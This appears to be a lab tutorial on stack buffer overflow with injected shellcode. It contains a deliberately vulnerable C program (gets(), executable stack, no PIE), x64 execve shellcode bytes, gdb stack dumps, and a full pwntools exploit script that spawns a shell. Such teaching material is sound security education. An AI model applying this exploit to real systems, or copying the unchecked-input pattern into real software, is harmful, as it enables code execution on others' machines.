# Shellcode

The code below doesn't even have a `system` call, now what?

```c
#include <stdio.h>
int main(){
    char name[100];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc chal.c -o chal -z execstack -no-pie`

If we run `checksec chal`, we find that the executable has NX disabled. This means we can use a buffer overflow overwrite of the `rip` to execute code in the stack, which we control through the name buffer. Such code that executes a shell is known as shellcode.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

## Payload

You can easily find shellcode for [x64](https://www.exploit-db.com/exploits/42179) and [x86](https://www.exploit-db.com/exploits/46809) on exploit-db. Our payload will look like the general buffer overflow payload, except part of the padding will be replaced by shellcode.

```python
# Buffer overflow payload
p.sendline(b"a"*120+p64(some address))
```

Now, our payload will consist of 4 parts

```python
# NOP sled
nop = b"\x90"*25
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
padding = b"a" * (120 - len(nop+shellcode))
addr = p64(some address)
p.sendline(nop + shellcode + padding + addr)
```

The NOP sled is a series of [NOP](https://www.felixcloutier.com/x86/nop) instructions that don't do anything. This prevents the program crashing if we get the address to jmp to slightly wrong. We could put he shellcode after `rip`,but that's not recommended because `addr` probably has null bytes that would prevent the program from writing the whole payload.

Next, we need to find the position of our shellcode on the stack. The easiest way to do this is to run the program in a debugger, se a breakpoint and inspect the stack. 

```
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf70 ('a' <repeats 52 times>)
0008| 0x7fffffffdf78 ('a' <repeats 44 times>)
0016| 0x7fffffffdf80 ('a' <repeats 36 times>)
0024| 0x7fffffffdf88 ('a' <repeats 28 times>)
0032| 0x7fffffffdf90 ('a' <repeats 20 times>)
0040| 0x7fffffffdf98 ('a' <repeats 12 times>)
0048| 0x7fffffffdfa0 --> 0x61616161 ('aaaa')
0056| 0x7fffffffdfa8 --> 0x4011f5 (<__libc_csu_init+69>:        add    rbx,0x1)
[------------------------------------------------------------------------------]


Breakpoint 1, 0x000000000040118a in main ()
```

From this stack printout, we can find that we want to jump to `0x7fffffffdf70` as that's where the stack begins. However, if we set this address in the payload, the exploit doesn't actually work. Let's debug it and print the stack again:

```
gdb-peda$ x/120x 0x7fffffffdf70
0x7fffffffdf70: 0x0000000000000000      0x0000000000000092
0x7fffffffdf80: 0x00007ffff7faf6a0      0x00007fffffffe010
0x7fffffffdf90: 0x0000000000404040      0x00007ffff7fb04a0
0x7fffffffdfa0: 0x0000000000000000      0x00007ffff7e71709
0x7fffffffdfb0: 0x000000000000000a      0x00007ffff7e71b63
0x7fffffffdfc0: 0x000000000000007e      0x00007ffff7faf6a0
0x7fffffffdfd0: 0x00007fffffffe010      0x00007ffff7e6676a
0x7fffffffdfe0: 0x00000000cc000000      0x00007fff00ffe080
0x7fffffffdff0: 0x0000000000401060      0x0000000000000000
0x7fffffffe000: 0x0000000000000000      0x00000000004011a7
0x7fffffffe010: 0x9090909090909090      0x9090909090909090
0x7fffffffe020: 0x9090909090909090      0x9090909090909090
```

Strangely, the position of our code has now moved to `0x7fffffffe010` this could be due to `gdb` allocating some extra space for environment variables. Anyway, once we set the correct address the code will work.

```python
from pwn import *

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
p = process("./chal")
e = ELF("./chal")
nop = b"\x90" * 25
shellcode_location = p64(0x7fffffffe010)
payload = nop+shellcode
p.sendline(payload+b"\xcc"*(120-len(payload))+shellcode_location)
p.interactive()
```

```shell
Enter name: Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90PH1\xd2H1\xf6H\xbb/bin//shST_\xb0;\x0f\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x10\xff\xff\xff\x7f
$ ls /
bin   home          lib32      media  root  sys  vmlinuz
boot  initrd.img      lib64      mnt     run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt     sbin  usr
etc   lib          lost+found  proc     srv   var
$  
```

